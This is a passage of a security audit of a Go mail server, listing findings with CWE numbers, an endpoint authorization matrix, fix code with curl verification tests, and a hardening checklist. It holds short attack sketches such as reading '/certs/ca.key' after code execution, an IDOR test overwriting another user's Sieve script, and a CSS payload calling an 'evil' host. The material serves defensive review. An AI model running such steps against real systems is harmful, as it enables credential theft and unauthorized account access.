**Location:** [internal/gateway/imap/session.go:142-151, :760-780](../internal/gateway/imap/session.go#L142)
**Fix:** Gateway only issues deletes for IDs present in the session's most-recent LIST. Backend `DeleteMessage` must also verify the message's mailbox is linked to the JWT's account.

### H-17. Dovecot plaintext authentication enabled (`disable_plaintext_auth = no`)
**CWE:** CWE-522 (Insufficiently Protected Credentials) · OWASP A02
**Location:** [docker/dovecot/conf/dovecot.conf.tmpl:23](../docker/dovecot/conf/dovecot.conf.tmpl#L23)
**What:** Dovecot accepts unencrypted IMAP/POP3 AUTH. Opportunistic STARTTLS can be MITM-downgraded.
**Attack:** Any compromised container on `mailnet` sniffs IMAP/POP3 credentials in the clear. Active attacker on the subnet forces STARTTLS downgrade.
**Fix:** `disable_plaintext_auth = yes`. Bind non-TLS listeners to `127.0.0.1` only, or remove port 143/110 listeners.
**Detection:** `doveadm log` showing successful plaintext auth in prod.

### H-18. Dovecot SASL auth exposed unencrypted to all mailnet containers
**CWE:** CWE-522
**Location:** [docker/dovecot/conf/dovecot.conf.tmpl:78-81](../docker/dovecot/conf/dovecot.conf.tmpl#L78)
**What:** `inet_listener` on `0.0.0.0:12345` without TLS. Postfix authenticates to Dovecot via plaintext TCP on mailnet.
**Attack:** Compromised mailnet container sniffs SASL PLAIN exchanges between Postfix and Dovecot. Or connects directly to port 12345 and brute-forces.
**Fix:** Use Unix socket (`service auth { unix_listener auth-postfix { mode=0660 user=postfix } }`) or bind to `127.0.0.1` only in a shared-netns deployment.
**Detection:** `netstat -tlnp` in dovecot container should not show `0.0.0.0:12345` in prod.

### H-19. Certificate private keys readable by all mailnet containers
**CWE:** CWE-276 (Incorrect Default Permissions)
**Location:** [docker-compose.yml](../docker-compose.yml) — many services bind `certs:/certs:ro`
**What:** `/certs/*.key` readable inside every container that mounts the volume. Any container RCE extracts the CA key + domain keys.
**Attack:** RCE in API container → `cat /certs/ca.key` → re-sign certs offline; MITM mail traffic or client connections.
**Fix:** Store private keys in a secrets manager, not bind-mounted files. If using volumes, mount `:ro` with file mode `600` and ownership matching the container's non-root user (C-17). Use tmpfs for runtime certs.
**Detection:** File permission audit in every container that mounts `/certs`.

### H-20. RESTMAIL capability cache URL hijack potential
**CWE:** CWE-295 · CWE-345
**Location:** [internal/gateway/queue/worker.go:285-300](../internal/gateway/queue/worker.go#L285)
**What:** Cache stores `{domain: recipient_domain, url: <from_EHLO>}`. Attacker-controlled MX publishes `RESTMAIL https://attacker/evil`; on multi-tenant relays or shared-MX setups, poisoned cache entries can redirect outbound for legitimate domains.
**Fix:** Key cache by `(recipient_domain, mx_hostname, mx_cert_fingerprint)`. Only trust RESTMAIL for whitelisted peers, not arbitrary EHLO advertisements. TTL + invalidation on cert rotation.
**Detection:** Log every RESTMAIL capability cache entry creation/use.

### H-21. Account-linking TOCTOU + no single-mailbox-per-link constraint
**CWE:** CWE-362 / CWE-363 (Race Condition) · CWE-639
**Location:** [internal/api/handlers/accounts.go:129-185](../internal/api/handlers/accounts.go#L129)
**What:** No transaction between mailbox lookup and linked_accounts insert. Unique constraint is on `(webmail_account_id, mailbox_id)` — two different webmail accounts can link the same mailbox.
**Attack:** Two users link mailbox M simultaneously; both succeed. Either can now read M. Also: after admin unlinks A's link, A's existing JWT continues working for 15 min (access TTL).
**Fix:** Wrap link operation in a transaction with `SELECT FOR UPDATE` on the mailbox. Add unique constraint on `mailbox_id` alone (one link per mailbox). Handlers must re-verify linkage on every request, not trust the JWT.
**Detection:** Alert if any mailbox appears in more than one `linked_accounts` row.

### H-22. Refresh endpoint issues mailbox-type token for admin refresh
**CWE:** CWE-287 (Improper Authentication)
**Location:** [internal/api/handlers/auth.go:219](../internal/api/handlers/auth.go#L219), [internal/auth/auth.go](../internal/auth/auth.go)
**What:** `Refresh()` calls `GenerateTokenPair()` unconditionally, ignoring `claims.UserType`. Admin refresh returns a mailbox token, which may lose admin caps (minor availability issue) but hints at missing type-awareness that could be exploited by future claim-confusion bugs.
**Fix:** Branch on `claims.UserType`; call `GenerateAdminTokenPair` for admin refresh, `GenerateTokenPair` for mailbox. Reject any token whose `UserType` doesn't match the endpoint it was used on.

### H-23. CI/CD uses `StrictHostKeyChecking=no` on deploy SSH
**CWE:** CWE-295
**Location:** [.github/workflows/deploy.yml:53](../.github/workflows/deploy.yml#L53)
**What:** SSH-based deployment accepts unknown host keys.
**Attack:** MITM between GitHub runner and target host (BGP hijack, ISP-level MITM, or compromised hop) → attacker intercepts deploy key + executes arbitrary commands on the deployment host, or injects backdoored compose file.
**Fix:** Store target host's SSH key in GitHub Secrets as `DEPLOY_HOST_KEY`; use `-o UserKnownHostsFile=~/.ssh/known_hosts` with key pre-populated.
**Detection:** Audit `/var/log/auth.log` on deploy host for ssh connections from unexpected IPs.

### H-24. JWT `alg` not explicitly pinned to HS256
**CWE:** CWE-347 (Improper Verification of Cryptographic Signature)
**Location:** [internal/auth/auth.go:165-171](../internal/auth/auth.go#L165)
**What:** Validator checks `*jwt.SigningMethodHMAC` (accepts HS256/HS384/HS512 interchangeably). No explicit pin. No `typ: JWT` check. No `kid` handling (fine, nothing uses JWKS today — but silent future migration to RS256 without explicit rejection of HS+pubkey substitution is a latent risk).
**Fix:** Pin exactly `HS256`: `if token.Method.Alg() != "HS256" { return nil, errors.New("alg mismatch") }`. Explicitly reject `alg: none`. Verify `typ: JWT`.
**Detection:** Log every auth failure with `alg` header value.

---

## 5. Medium (27)

| # | Finding | CWE | Location | Detection |
|---|---------|-----|----------|-----------|
| M-1 | TLS config lacks explicit cipher suite hardening (relies on Go defaults) | CWE-327 | [cmd/smtp-gateway/main.go:75-78](../cmd/smtp-gateway/main.go#L75) | TLS scan via sslyze / testssl.sh |
| M-2 | Connection limiter check-then-increment race | CWE-362 | [internal/gateway/connlimiter/limiter.go:68-86](../internal/gateway/connlimiter/limiter.go#L68) | Metric on concurrent-connection peaks vs configured max |
| M-3 | IMAP UIDs are raw DB primary keys; enumerable | CWE-340 | [internal/gateway/imap/session.go:534-535](../internal/gateway/imap/session.go#L534) | N/A — design choice |
| M-4 | Greeting banners reveal "RestMail" name (recon aid) | CWE-200 | [internal/gateway/smtp/session.go:73](../internal/gateway/smtp/session.go#L73) et al | External banner scan |
| M-5 | Attachment path traversal mitigation doesn't follow symlinks | CWE-59 | [internal/api/handlers/attachments.go:66-69](../internal/api/handlers/attachments.go#L66) | Integrity check on `/attachments` directory |
| M-6 | Mass-assignment pattern via `Updates(map)` — safe today, fragile | CWE-915 | [internal/api/handlers/mailboxes.go:155-177](../internal/api/handlers/mailboxes.go#L155) | Code review on struct field changes |
| M-7 | Handlers trust middleware chain; no in-handler defense | CWE-285 | all admin handlers | — |
| M-8 | Rate-limit filter state in-memory; not cluster-safe, lost on restart | CWE-770 | [internal/pipeline/filters/rate_limit.go:18-44](../internal/pipeline/filters/rate_limit.go#L18) | Metric on burst-after-restart |
| M-9 | DKIM signs only `from:to:subject:date:message-id` — modifiable headers bypass signature | CWE-290 | [internal/pipeline/filters/dkim.go:187-189](../internal/pipeline/filters/dkim.go#L187) | External DKIM validator |
| M-10 | CORS allows configured origins verbatim; no reject on `*`+Credentials | CWE-942 | [internal/api/routes.go:35-41](../internal/api/routes.go#L35) | Startup log of effective CORS config |
| M-11 | fail2ban regex extracts IP from JSON log field; log injection can ban arbitrary IPs | CWE-74 | [docker/fail2ban/filter.d/restmail-smtp.conf](../docker/fail2ban/filter.d/restmail-smtp.conf) | Alert on unexpected `jail.log` ban targets |
| M-12 | `POST /autodiscover/autodiscover.xml` — no XXE mitigation documented | CWE-611 | autoconfig handlers | — |
| M-13 | Search endpoint only checks primary mailbox; linked accounts silently excluded | (functional gap) | [internal/api/handlers/search.go:24-47](../internal/api/handlers/search.go#L24) | User report |
| M-14 | Pipeline/filter test endpoints unrate-limited | CWE-770 | [internal/api/handlers/pipeline.go:166-238](../internal/api/handlers/pipeline.go#L166) | — |
| M-15 | Grafana exposed on `:3001` with default creds, Prometheus on `:9090` | CWE-798 | [monitoring/docker-compose.yml](../monitoring/docker-compose.yml) | External port scan |
| M-16 | API binds to `0.0.0.0` by default, exposed by docker-compose port publishing | CWE-1327 | [internal/config/config.go:84](../internal/config/config.go#L84) | — |
| M-17 | `/api/v1/admin/test/send` weaponizable as spam cannon by any admin | CWE-770 | [internal/api/handlers/testing.go](../internal/api/handlers/testing.go) | Alert on outbound volume |
| M-18 | Postfix submission (587) `smtpd_tls_security_level = may` — optional TLS | CWE-295 | [docker/postfix/conf/master.cf.tmpl:9-16](../docker/postfix/conf/master.cf.tmpl#L9) | `openssl s_client` test |
| M-19 | Unversioned container images (`rspamd:latest`, `clamav:stable`, `benzino77/clamav-rest-api:latest`) | CWE-426 | [docker-compose.yml:357,373,390](../docker-compose.yml#L357) | Image digest in runtime inspect |
| M-20 | Single flat `mailnet` — no network segmentation for lateral movement | (architectural) | [docker-compose.yml:1-4](../docker-compose.yml#L1) | `docker network inspect` |
| M-21 | Fail2ban uses `network_mode: host` + `NET_ADMIN` + `NET_RAW` | CWE-250 | [docker-compose.yml:408-419](../docker-compose.yml#L408) | `docker inspect fail2ban` |
| M-22 | ACME client has no per-domain issuance rate-limit | CWE-770 | [internal/acme/client.go:58-85](../internal/acme/client.go#L58) | LE acme account order history |
| M-23 | ACME HTTP-01 handler uses autocert without explicit path restriction | CWE-22 | [internal/acme/client.go:97-104](../internal/acme/client.go#L97) | Access log on `/.well-known/acme-challenge` |
| M-24 | SMTP auth logging includes plaintext email addresses | CWE-532 | [internal/gateway/smtp/session.go:320](../internal/gateway/smtp/session.go#L320) | Log review |
| M-25 | Unlinked mailbox remains accessible via old JWT (up to 15 min) | CWE-613 | throughout handlers using `claims.WebmailAccountID` | Audit log of unlink vs subsequent access |
| M-26 | No password reset / self-service recovery endpoint | CWE-640 | (not implemented) | User report |
| M-27 | Postgres exporter DSN uses `sslmode=disable` for DB connection | CWE-319 | [monitoring/docker-compose.yml:42](../monitoring/docker-compose.yml#L42) | `pg_stat_ssl` query |

---

## 6. Low / Info (11)

| # | Finding | CWE | Location |
|---|---------|-----|----------|
| L-1 | `docker-compose.override.yml` mounts host source tree into containers | CWE-552 | [docker-compose.override.yml:12-41](../docker-compose.override.yml#L12) |
| L-2 | Email HTML rendered in main webmail document context (no iframe) | CWE-829 | [webmail/src/components/mail/MessageViewer.tsx](../webmail/src/components/mail/MessageViewer.tsx) |
| L-3 | TanStack DevTools included unconditionally in admin root | CWE-489 | [admin/src/routes/__root.tsx:48-58](../admin/src/routes/__root.tsx#L48) |
| L-4 | Sieve parser is hand-rolled; potential edge-case handling bugs | CWE-20 | [internal/pipeline/filters/sieve.go:431-469](../internal/pipeline/filters/sieve.go#L431) |
| L-5 | Authentication-Results header added post-signing; not DKIM-covered | CWE-290 | [internal/pipeline/filters/dkim.go](../internal/pipeline/filters/dkim.go) |
| L-6 | No SMTP command-pipelining depth cap | CWE-770 | [internal/gateway/smtp/session.go:143-170](../internal/gateway/smtp/session.go#L143) |
| L-7 | Gateway auth-failure logging sparse; reconnaissance hard to detect | CWE-778 | gateways |
| L-8 | Dependency CVE scan not performed — run `govulncheck` + `npm audit` | — | — |
| L-9 | No 2FA for user or admin accounts | CWE-308 | (not implemented) |
| L-10 | Message-ID format is structured hex (128-bit entropy sufficient but formatting predictable) | CWE-340 | [internal/mail/messageid.go:12-19](../internal/mail/messageid.go#L12) |
| L-11 | Dovecot quota plugin not explicitly loaded in config (relies on default behavior) | CWE-770 | [docker/dovecot/conf/dovecot.conf.tmpl:107-109](../docker/dovecot/conf/dovecot.conf.tmpl#L107) |

---

## 7. Per-endpoint authorization matrix

Compact result of walking every route in [internal/api/routes.go](../internal/api/routes.go). ✅ = verified safe; ⚠️ = issue referenced above.

### 7.1 Unauthenticated (intended public surface)
| Method | Path | Verdict |
|--------|------|---------|
| GET | `/api` | ✅ discovery only |
| GET | `/api/docs` | ✅ static |
| GET | `/api/docs/openapi.yaml` | ✅ static |
| GET | `/api/health` | ✅ DB-health only |
| GET | `/metrics` | ⚠️ **H-12** |
| GET | `/.well-known/autoconfig/mail/config-v1.1.xml` | ✅ |
| GET | `/mail/config-v1.1.xml` | ✅ |
| POST | `/autodiscover/autodiscover.xml` | ⚠️ **M-12** |
| GET | `/.well-known/mta-sts.txt` | ✅ intended |
| POST | `/.well-known/smtp-tlsrpt` | ✅ intended |
| GET | `/.well-known/acme-challenge/*` | ⚠️ **M-23** |

### 7.2 Auth endpoints
| Method | Path | Verdict |
|--------|------|---------|
| POST | `/api/v1/auth/login` | ⚠️ **H-2 H-3** |
| POST | `/api/v1/auth/logout` | ⚠️ **C-6** |
| POST | `/api/v1/auth/refresh` | ⚠️ **C-6 H-22 H-24** |

### 7.3 Inbound delivery & RESTMAIL (unauthenticated)
| Method | Path | Verdict |
|--------|------|---------|
| GET | `/api/mailboxes?address=` | ⚠️ **C-4** |
| POST | `/api/v1/messages/deliver` | ✅ internal-only |
| GET | `/restmail/capabilities` | ✅ |
| GET | `/restmail/mailboxes?address=` | ⚠️ **C-4** |
| POST | `/restmail/messages` | ⚠️ **C-1** |

### 7.4 SSE (JWT)
| Method | Path | Verdict |
|--------|------|---------|
| GET | `/api/v1/accounts/{id}/events` | ✅ `resolveAccountMailbox` |

### 7.5 Accounts (JWT)
All verified ✅ (five routes — list, get, post, delete, test-connection) — but linkage revocation propagation is **M-25**.

### 7.6 Messages, Folders, Drafts, Threads (JWT)
All verified ✅ — each handler uses `verifyMessageOwnership` or `resolveAccountMailbox`.

### 7.7 Attachments (JWT)
| Method | Path | Verdict |
|--------|------|---------|
| GET | `/api/v1/attachments/{id}` | ✅ JOIN-based ownership, but **C-12**, **C-14**, **M-5** |
| GET | `/api/v1/messages/{id}/attachments` | ✅ |

### 7.8 Contacts, Vacation, Calendar, Quarantine (JWT)
All verified ✅.

### 7.9 Sieve (JWT) — CRITICAL
| Method | Path | Verdict |
|--------|------|---------|
| GET | `/api/v1/accounts/{id}/sieve` | ⚠️ **C-2** |
| PUT | `/api/v1/accounts/{id}/sieve` | ⚠️ **C-2** |
| DELETE | `/api/v1/accounts/{id}/sieve` | ⚠️ **C-2** |
| POST | `/api/v1/accounts/{id}/sieve/validate` | ✅ no persistence |

### 7.10 Search (JWT)
| Method | Path | Verdict |
|--------|------|---------|
| GET | `/api/v1/accounts/{id}/search` | ⚠️ **M-13** |

### 7.11 Admin (JWT + AdminOnly — **all affected by H-1**)
Every admin group (admin-users, domains, mailboxes, aliases, queue, pipelines, custom-filters, DKIM, certs, bans, logs, mta-sts, tls-rpt, stats) inherits the missing per-capability gate. See H-1; individual handlers otherwise behave correctly on the ownership dimensions they can check (there is no "own-domain" constraint — all admins can touch all domains).

### 7.12 Test endpoints
All behind C-13 gate. Every endpoint in this group is destructive or abusive: M-17 for test/send, C-13 for reset/seed/snapshot/restore.

---

## 8. Remediation plan with verification tests

### Phase 0 — same-day hardening

Each item < 1 hour. Verification tests prove the fix; pre-fix failure modes listed so you can confirm the tests are meaningful.

#### P0-1. C-2 Fix Sieve IDOR (15 min)

Add ownership check to all three Sieve handlers in [internal/api/handlers/sieve.go](../internal/api/handlers/sieve.go). Pattern:
```go
mailboxID, err := h.resolveMailboxID(r, chi.URLParam(r, "id"))
if err != nil {
    respond.Error(w, http.StatusForbidden, "forbidden", "")
    return
}
```

**Verification test:**
```bash
# Create two accounts A (id=1) and B (id=2)
TA=$(curl -sX POST /api/v1/auth/login -d '{"email":"a@t","password":"..."}' | jq -r .access_token)
# As A, try to PUT B's sieve
curl -sX PUT -H "Authorization: Bearer $TA" \
  -d '{"script":"#","active":false}' \
  http://localhost:8080/api/v1/accounts/2/sieve
# Expect: 403 Forbidden
# Pre-fix: 200 OK and B's sieve was overwritten
```

#### P0-2. C-4 Gate or remove mailbox-enumeration endpoints (30 min)

Either delete handlers at [internal/api/handlers/mailboxes.go:211](../internal/api/handlers/mailboxes.go#L211) and [internal/api/handlers/restmail.go:45](../internal/api/handlers/restmail.go#L45), or add `JWTMiddleware` to their route declarations in [internal/api/routes.go](../internal/api/routes.go).

**Verification test:**
```bash
curl -s http://localhost:8080/api/mailboxes?address=admin@mail3.test
# Expect: 401 Unauthorized or 404 Not Found
# Pre-fix: {"exists":true}
```

#### P0-3. C-11 Remove hardcoded secrets (45 min)

1. `git rm .env` (add to `.gitignore`).
2. Edit [docker-compose.yml](../docker-compose.yml): replace inline `JWT_SECRET`, `MASTER_KEY`, `POSTGRES_PASSWORD`, `GF_SECURITY_ADMIN_PASSWORD` with `${VAR_NAME:?required}` — interpolation fails at `docker compose up` time if unset.
3. Edit [internal/config/config.go](../internal/config/config.go) to fail startup if any secret is empty, equals the historical default, or shorter than 32 bytes — regardless of environment.
4. Ship `.env.example` with `_PLACEHOLDER_` values; script `task secrets:generate` that populates a real `.env`.

**Verification tests:**
```bash
# (a) No secrets in repo
grep -r "dev-secret-change-in-production\|dev-master-key-change-in-production\|GF_SECURITY_ADMIN_PASSWORD: restmail" --include="*.yml" --include="*.env*" .
# Expect: no matches

# (b) Missing-secret startup fails fast
JWT_SECRET="" go run ./cmd/api 2>&1 | head -5
# Expect: fatal error within 1s

# (c) Default-secret startup fails
JWT_SECRET="dev-secret-change-in-production" go run ./cmd/api 2>&1 | head -5
# Expect: fatal error rejecting legacy default
```

#### P0-4. C-13 Gate test endpoints (15 min)

In [internal/api/handlers/testing.go](../internal/api/handlers/testing.go), replace the single-string environment check with:
```go
env := strings.ToLower(strings.TrimSpace(h.cfg.Environment))
isProduction := env == "production" || env == "prod" || strings.HasPrefix(env, "prod-")
enable := os.Getenv("ENABLE_TEST_ENDPOINTS") == "yes"
if isProduction || !enable {
    respond.Error(w, http.StatusForbidden, "forbidden", "test endpoints disabled")
    return
}
```

**Verification tests:**
```bash
# (a) production env blocks
ENVIRONMENT=production ENABLE_TEST_ENDPOINTS=yes \
  curl -sX POST /api/v1/admin/test/reset -H "Authorization: Bearer $ADMIN"
# Expect: 403

# (b) prod typo variants also blocked
ENVIRONMENT=PROD curl ... # 403
ENVIRONMENT=prod curl ... # 403

# (c) dev env still requires explicit enable
ENVIRONMENT=development ENABLE_TEST_ENDPOINTS=no curl ... # 403
ENVIRONMENT=development ENABLE_TEST_ENDPOINTS=yes curl ... # 200
```

#### P0-5. C-16 Harden webmail DOMPurify (30 min)

Edit [webmail/src/components/mail/MessageViewer.tsx](../webmail/src/components/mail/MessageViewer.tsx) (around line 401). Remove `style` and `class` from `ALLOWED_ATTR`:
```tsx
DOMPurify.sanitize(msg.body_html, {
  ALLOWED_TAGS: ['p','br','b','i','u','strong','em','a','ul','ol','li',
                 'h1','h2','h3','h4','blockquote','pre','code','hr','table',
                 'thead','tbody','tr','th','td','span','div','img'],
  ALLOWED_ATTR: ['href','alt','title','target','rel','src'],
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]*(?:[^a-z+.\-:]|$))/i,
})
```

**Verification test** (add to [webmail/src/components/mail/MessageViewer.test.tsx](../webmail/src/components/mail/MessageViewer.test.tsx)):
```tsx
it('strips style attributes from email HTML', () => {
  const rendered = render(<MessageViewer msg={{...mockMsg, body_html:
    '<div style="background:url(https://evil)">x</div>'}} />)
  expect(rendered.container.innerHTML).not.toContain('style=')
  expect(rendered.container.innerHTML).not.toContain('evil')
})
```

#### P0-6. H-12 Gate `/metrics` (15 min)

In [internal/api/routes.go:116](../internal/api/routes.go#L116), wrap the handler:
```go
r.Route("/metrics", func(r chi.Router) {
    r.Use(middleware.JWTMiddleware(jwtService))
    r.Use(middleware.RequireCapability("metrics:read"))
    r.Handle("/", promhttp.Handler())
})
```

**Verification test:**
```bash
curl -s http://localhost:8080/metrics
# Expect: 401 Unauthorized
curl -sH "Authorization: Bearer $ADMIN_WITH_METRICS_CAP" http://localhost:8080/metrics
# Expect: 200 + Prometheus text
```

#### P0-7. H-13 Add security headers (30 min)

In [internal/api/routes.go](../internal/api/routes.go), add middleware:
```go
r.Use(func(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("Referrer-Policy", "no-referrer")
        w.Header().Set("Content-Security-Policy",
            "default-src 'self'; frame-ancestors 'none'")
        next.ServeHTTP(w, r)
    })
})
```

Edit [webmail/nginx.conf](../webmail/nginx.conf) and `admin/nginx` config with `add_header ... always;` equivalents.

**Verification test:**
```bash
curl -sI https://mail.example.com/api/health | grep -iE 'strict-transport|x-frame|x-content|referrer|content-security'
# Expect 5 lines
```

### Phase 1 — this week

Items under 1 day each. Close remaining Critical and the most exploitable High findings.

- **C-1** DKIM verification on `POST /restmail/messages` or disable endpoint (~4 h)
- **C-5** Remove `IsAdmin` from WebmailAccount; update AdminOnly to `UserType=="admin"` only (~2 h)
- **C-6** Refresh-token rotation + revocation table (~4 h)
- **C-12** Validate/escape `Content-Disposition` filename (RFC 6266 encoding) (~1 h)
- **C-15** Remove silent plaintext fallback in DKIM sign (~1 h)
- **H-1** Apply `RequireCapability(...)` per admin route (~6 h, mechanical)
- **H-2 H-3 H-14** Rate limit `/auth/login`; always-bcrypt; constant-time error (~4 h)
- **C-3** Sieve redirect allowlist (own-domain default) (~2 h)
- **H-24** Pin JWT `alg` to HS256 explicitly (~15 min)
- **H-17** Dovecot `disable_plaintext_auth = yes` (~30 min)
- **H-18** Dovecot SASL on Unix socket (~1 h)
- **H-23** Pre-populate SSH known_hosts in deploy workflow (~30 min)

### Phase 2 — sprint

- **C-7 H-10** Replace JS sandbox with `isolated-vm` or remove user-uploaded JS (~2 days)
- **C-8** Webhook URL allowlist + IP denylist + scheme validation (~1 day)
- **C-9** mTLS or HMAC on rspamd/ClamAV; change default `fallback_action` to `defer` (~1 day)
- **C-10** Validate/escape domain names before dnsmasq config writes (~0.5 day)
- **C-14** Per-mailbox dedup scope (~0.5 day)
- **C-17** Non-root USER in all Dockerfiles (~0.5 day)
- **H-5** CRLF rejection after RFC 2047 decode (~0.5 day)
- **H-6** Bounce sender authentication check; DSN rate-limit (~0.5 day)
- **H-7** Strict `\r\n` enforcement (~0.5 day)
- **H-8** Filter name validation at pipeline create; fail-closed at runtime (~0.5 day)
- **H-11** Admin IP/VPN gate + 2FA (~1 day, mostly deployment)
- **H-19** Move certificate keys out of mounted volumes (~1 day)
- **H-20** RESTMAIL capability cache keyed by MX identity (~0.5 day)
- **H-21** Account-linking transaction + single-link constraint (~0.5 day)

### Phase 3 — ongoing

- All Medium (§5) and Low (§6) findings
- `govulncheck ./...` and `pnpm audit` in webmail/ and admin/; patch
- 2FA (L-9, H-11)
- Admin action audit logging + alerting
- Threat-model every new feature against this review before merge

---

## 9. Deployment hardening checklist

Separate from code fixes. Operational controls for a safe production deploy.

### 9.1 Secrets management
- [ ] `JWT_SECRET` generated via `openssl rand -base64 48`, ≥ 32 bytes, stored in secrets manager
- [ ] `MASTER_KEY` generated similarly, stored in secrets manager, **backed up separately** (losing it = loss of every DKIM & TLS private key)
- [ ] Postgres password unique per instance, ≥ 20 chars
- [ ] Grafana admin password changed from default
- [ ] Every `_PASSWORD` / `_SECRET` / `_KEY` / `_TOKEN` env var audited; no repo values anywhere
- [ ] `.env` file not committed (`.gitignore` verified)
- [ ] Seed data (`task db:seed`) not run in production — or seeds with random passwords only
- [ ] Verify repo scan `grep -rE "restmail|admin123|password123|dev-secret|dev-master"` comes back clean

### 9.2 TLS & cryptography
- [ ] Public endpoints behind TLS with valid cert
- [ ] HSTS header set; optionally submit to preload list
- [ ] TLS min version 1.2 (reject 1.0/1.1 explicitly)
- [ ] Self-signed certs removed from prod
- [ ] DKIM private keys encrypted with `MASTER_KEY`; verify no plaintext records in `domains.dkim_private_key`
- [ ] Certificate renewal configured; ACME rate-limit monitoring
- [ ] `sslmode=require` on ALL Postgres connection strings (including monitoring exporter)

### 9.3 Network
- [ ] Reverse proxy sets HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy on every response
- [ ] `/metrics` and `/api/v1/admin/*` behind IP allowlist or VPN
- [ ] Grafana and Prometheus not port-published
- [ ] Postgres ports not port-published
- [ ] `ENVIRONMENT=production` explicitly set
- [ ] `ENABLE_TEST_ENDPOINTS` unset or explicitly `no`
- [ ] Firewall restricts inbound to the intended ports only (25/587/465/143/993/110/995/80/443)
- [ ] Gateway-to-API internal calls use internal network (not public IPs)

### 9.4 Containers
- [ ] All Dockerfiles use `USER <nonroot>` directive (Postfix, Dovecot, Nginx, sidecar, API)
- [ ] Docker network segmented — at minimum separate `public` (API, web) / `data` (Postgres) / `processing` (Postfix, Dovecot, scanners) networks
- [ ] No `/var/run/docker.sock` mounts anywhere
- [ ] `docker-compose.override.yml` excluded from production deploy
- [ ] All base images pinned by digest (`@sha256:...`) — not `:latest` / `:stable` / floating tags
- [ ] `read_only: true` filesystem on containers where feasible (API, sidecar, scanners)
- [ ] `cap_drop: [ALL]`, `cap_add` only what's required
- [ ] `security_opt: [no-new-privileges]` on all services
- [ ] `fail2ban` uses bridge network, not `host` (see M-21)

### 9.5 Auth & access control
- [ ] Rate limit on `/auth/login` (verify: 429 after 5 failures in 1 min)
- [ ] Account lockout after 10 failures
- [ ] 2FA (TOTP or WebAuthn) mandatory for all admin accounts
- [ ] `RequireCapability` middleware applied per admin route (H-1 fix verified with test)
- [ ] Refresh token rotation enabled (C-6 fix verified with test)
- [ ] Logout revokes refresh state (C-6 fix verified)

### 9.6 Data layer
- [ ] Database backups (pg_dump or WAL-E/G) running and verified with a restore drill
- [ ] Attachment backup strategy defined (S3 versioning or tar snapshot)
- [ ] `MASTER_KEY` backup stored separately from DB backup (loss = cryptographic lockout)
- [ ] Monitoring alert on DB connection pool exhaustion

### 9.7 Frontends
- [ ] React DevTools stripped from admin production build (L-3)
- [ ] CSP header strict — no unsafe-inline for scripts
- [ ] DOMPurify `ALLOWED_ATTR` excludes `style` and `class` (C-16 verified)
- [ ] Webmail renders email in sandboxed iframe (L-2)
- [ ] No secrets in `VITE_*` / any frontend env vars

### 9.8 Monitoring & incident response
- [ ] fail2ban watches gateway logs with tested regexes (M-11)
- [ ] Alerts configured for:
  - > 5 failed admin logins / hour (any source)
  - New admin-user created (H-1 fix enables capability-aware alerting)
  - Any `/api/v1/admin/test/*` call in production
  - DKIM decryption failure (C-15)
  - "Pipeline filter instantiate failed" log event (H-8)
  - New outbound IP/MX used by queue worker (H-20)
  - Unexpected Sieve redirect installs (C-3)
  - Attachment dedup reuse across mailboxes (C-14)
- [ ] Admin action audit log with ≥ 90-day retention
- [ ] Access logs shipped to centralized SIEM
- [ ] Cert expiry alerts at 30/14/7/1 day remaining
- [ ] Incident-response runbook; key-rotation runbook; MASTER_KEY-restore runbook

### 9.9 Supply chain
- [ ] Base Docker images pinned by digest
- [ ] CI actions pinned by SHA (`actions/checkout@<sha>`), not tag
- [ ] Deploy SSH uses pre-populated `known_hosts` (H-23 fix)
- [ ] Go modules verified (`go mod verify` in CI)
- [ ] npm audit / pnpm audit passing in CI
- [ ] `govulncheck ./...` passing in CI
- [ ] Image signing (cosign / Notary) — optional but recommended for multi-maintainer environments

---

## 10. References

### 10.1 CWE (Common Weakness Enumeration)

Links: `https://cwe.mitre.org/data/definitions/<n>.html`

| CWE | Name |
|-----|------|
| 20 | Improper Input Validation |
| 22 | Improper Limitation of a Pathname to a Restricted Directory |
| 59 | Improper Link Resolution Before File Access |
| 74 | Improper Neutralization of Special Elements in Output |
| 78 | OS Command Injection |
| 79 | XSS |
| 93 | CRLF Injection |
| 94 | Code Injection |
| 113 | HTTP Response Splitting |
| 190 | Integer Overflow or Wraparound |
| 200 | Exposure of Sensitive Information |
| 204 | Observable Response Discrepancy |
| 208 | Observable Timing Discrepancy |
| 250 | Execution with Unnecessary Privileges |
| 269 | Improper Privilege Management |
| 276 | Incorrect Default Permissions |
| 284 | Improper Access Control |
| 285 | Improper Authorization |
| 287 | Improper Authentication |
| 290 | Authentication Bypass by Spoofing |
| 295 | Improper Certificate Validation |
| 306 | Missing Authentication for Critical Function |
| 307 | Improper Restriction of Excessive Authentication Attempts |
| 308 | Use of Single-factor Authentication |
| 311 | Missing Encryption of Sensitive Data |
| 319 | Cleartext Transmission of Sensitive Information |
| 325 | Missing Cryptographic Step |
| 327 | Use of a Broken or Risky Cryptographic Algorithm |
| 340 | Predictability or Uniqueness Issues |
| 345 | Insufficient Verification of Data Authenticity |
| 346 | Origin Validation Error |
| 347 | Improper Verification of Cryptographic Signature |
| 362 | Concurrent Execution using Shared Resource with Improper Synchronization |
| 363 | Race Condition Enabling Link Following |
| 384 | Session Fixation |
| 391 | Unchecked Error Condition |
| 400 | Uncontrolled Resource Consumption |
| 426 | Untrusted Search Path |
| 451 | User Interface Misrepresentation of Critical Information |
| 489 | Active Debug Code |
| 501 | Trust Boundary Violation |
| 522 | Insufficiently Protected Credentials |
| 532 | Insertion of Sensitive Information into Log File |
| 552 | Files or Directories Accessible to External Parties |
| 601 | URL Redirection to Untrusted Site |
| 611 | Improper Restriction of XML External Entity Reference |
| 613 | Insufficient Session Expiration |
| 639 | Authorization Bypass Through User-Controlled Key |
| 640 | Weak Password Recovery Mechanism |
| 693 | Protection Mechanism Failure |
| 755 | Improper Handling of Exceptional Conditions |
| 770 | Allocation of Resources Without Limits or Throttling |
| 778 | Insufficient Logging |
| 798 | Use of Hard-coded Credentials |
| 829 | Inclusion of Functionality from Untrusted Control Sphere |
| 915 | Improperly Controlled Modification of Dynamically-Determined Object Attributes |
| 918 | Server-Side Request Forgery |
| 942 | Permissive Cross-domain Policy with Untrusted Domains |
